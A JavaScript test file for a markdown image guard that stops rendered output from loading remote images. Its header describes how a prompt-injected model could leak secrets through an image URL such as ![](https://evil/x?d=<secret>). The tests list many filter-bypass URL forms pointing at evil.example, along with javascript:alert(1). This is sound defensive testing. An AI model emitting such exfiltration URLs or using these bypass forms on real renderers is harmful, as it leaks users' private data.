// Rendered markdown must not load remote images on its own: an <img> fetches
// on render with no prompt, so a prompt-injected model could leak context with
// `![](https://evil/x?d=<secret>)`. See lib/markdownImages.ts.
// Run: node --test src/lib/__tests__/markdownImages.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import MarkdownIt from 'markdown-it'
import { dropRemoteMediaAttr, guardMarkdownImages, isLocalMediaSrc, isLocalSrcset } from '../markdownImages.ts'

const read = (path) => readFileSync(new URL(path, import.meta.url), 'utf8')

// Same options as useMarkdown() in lib/markdown.ts (renderText).
function renderText(src) {
  const md = new MarkdownIt({ html: false, linkify: true, typographer: true, breaks: true })
  guardMarkdownImages(md)
  return md.render(src)
}

const REMOTE = [
  'https://evil.example/x?d=secret',
  'http://evil.example/x',
  'HTTPS://evil.example/x',
  '//evil.example/x',
  '\\\\evil.example/x',
  '/\\evil.example/x',
  ' https://evil.example/x',
  '\x01https://evil.example/x',
  'ht\ttps://evil.example/x',
  'https:evil.example/x',
  'http://asset.localhost.evil.example/x',
  'http://asset.localhost@evil.example/x',
  'javascript:alert(1)',
  'blob:https://evil.example/1',
  'ftp://evil.example/x',
]
const LOCAL = [
  'data:image/png;base64,iVBORw0KGgo=',
  'asset://localhost/%2FUsers%2Fme%2Fa.png',
  'http://asset.localhost/%2FUsers%2Fme%2Fa.png',
  'https://asset.localhost/a.png',
  'a.png',
  './img/a.png',
  '../a.png',
  '/abs/a.png',
]

test('a remote markdown image renders as a link, not an <img>', () => {
  const html = renderText('![chart](https://evil.example/x?d=secret)')
  assert.doesNotMatch(html, /<img/, html)
  assert.match(html, /<a href="https:\/\/evil\.example\/x\?d=secret"[^>]*>chart<\/a>/, html)
})

test('a remote image without alt text shows its URL', () => {
  const html = renderText('![](https://evil.example/x)')
  assert.match(html, />https:\/\/evil\.example\/x<\/a>/, html)
})

test('local markdown images still render', () => {
  for (const src of ['data:image/png;base64,iVBORw0KGgo=', 'img/a.png', '../a.png', 'asset://localhost/a.png']) {
    const html = renderText(`![a](${src})`)
    assert.match(html, /<img src="/, `${src}: ${html}`)
  }
})

test('bypass forms of a markdown image never yield a remote <img>', () => {
  const forms = [
    '![a](HTTPS://evil.example/x)',
    '![a](//evil.example/x)',
    '![a](<//evil.example/x>)',
    '![a](https:evil.example/x)',
    '![a](http://asset.localhost.evil.example/x)',
    '![a](javascript:alert(1))',
    '![a][r]\n\n[r]: https://evil.example/x',
    '<img src="https://evil.example/x">',
  ]
  for (const src of forms) {
    const html = renderText(src)
    for (const m of html.matchAll(/<img src="([^"]*)"/g)) {
      assert.ok(isLocalMediaSrc(m[1]), `${src}: ${html}`)
    }
    assert.doesNotMatch(html, /<img src="(?:https?:)?\/\/(?!asset\.localhost\/)/i, `${src}: ${html}`)
  }
})

test('isLocalMediaSrc keeps only sources that cannot reach the network', () => {
  for (const src of REMOTE) assert.equal(isLocalMediaSrc(src), false, JSON.stringify(src))
  for (const src of LOCAL) assert.equal(isLocalMediaSrc(src), true, JSON.stringify(src))
})

test('isLocalSrcset rejects a set with any remote candidate', () => {
  assert.equal(isLocalSrcset('a.png 1x, b.png 2x'), true)
  assert.equal(isLocalSrcset('data:image/png;base64,AA,BB 1x'), true)
  assert.equal(isLocalSrcset('a.png 1x, https://evil.example/x 2x'), false)
  assert.equal(isLocalSrcset('a.png, https://evil.example/x'), false)
  // No space after the comma: the browser reads one relative URL, as we do.
  assert.equal(isLocalSrcset('a.png,https://evil.example/x'), true)
  assert.equal(isLocalSrcset('a.png 1x,//evil.example/x 2x'), false)
  assert.equal(isLocalSrcset('a.png 1x(, https://evil.example/x 2x)'), false)
  assert.equal(isLocalSrcset('\n\thttps://evil.example/x'), false)
})

// The DOMPurify hook only sees (node, event); fake both, as node has no DOM.
function keeps(nodeName, attrName, attrValue) {
  const data = { attrName, attrValue, keepAttr: true, allowedAttributes: {}, forceKeepAttr: undefined }
  dropRemoteMediaAttr({ nodeName }, data)
  return data.keepAttr
}

test('the DOMPurify hook drops remote media URLs from raw HTML', () => {
  assert.equal(keeps('IMG', 'src', 'https://evil.example/x'), false)
  assert.equal(keeps('IMG', 'src', '//evil.example/x'), false)
  assert.equal(keeps('IMG', 'srcset', 'a.png 1x, https://evil.example/x 2x'), false)
  assert.equal(keeps('SOURCE', 'srcset', 'https://evil.example/x'), false)
  assert.equal(keeps('VIDEO', 'poster', 'https://evil.example/x'), false)
  assert.equal(keeps('AUDIO', 'src', 'https://evil.example/x'), false)
  assert.equal(keeps('TD', 'background', 'https://evil.example/x'), false)
  assert.equal(keeps('image', 'href', 'https://evil.example/x'), false)
  assert.equal(keeps('image', 'xlink:href', 'https://evil.example/x'), false)
  assert.equal(keeps('feImage', 'href', 'https://evil.example/x'), false)
})

test('the DOMPurify hook keeps local media and link hrefs', () => {
  assert.equal(keeps('IMG', 'src', 'data:image/png;base64,AA'), true)
  assert.equal(keeps('IMG', 'src', 'img/a.png'), true)
  assert.equal(keeps('IMG', 'srcset', 'a.png 1x, b.png 2x'), true)
  assert.equal(keeps('A', 'href', 'https://example.com/'), true)
  assert.equal(keeps('a', 'href', 'https://example.com/'), true)
  assert.equal(keeps('IMG', 'alt', 'https://example.com/'), true)
  assert.equal(keeps('image', 'href', '#local'), true)
})

test('both markdown renderers install the guard', () => {
  assert.match(read('../markdown.ts'), /guardMarkdownImages\(_md\)/)
  const viewer = read('../../components/FileViewer.vue')
  assert.match(viewer, /guardMarkdownImages\(_md\)/)
  assert.match(viewer, /addHook\('uponSanitizeAttribute', dropRemoteMediaAttr\)/)
})

// Rule, skill and library-item previews build their own markdown-it (html:false,
// no DOMPurify) for content an agent can write, so each needs the guard too.
test('the rule, skill and library-item previews install the guard', () => {
  for (const path of [
    '../../components/rules/RuleDetail.vue',
    '../../components/skills/SkillDetail.vue',
    '../../components/libraryItems/LibraryItemDetail.vue',
  ]) {
    assert.match(read(path), /guardMarkdownImages\(mdi\)/, path)
  }
})
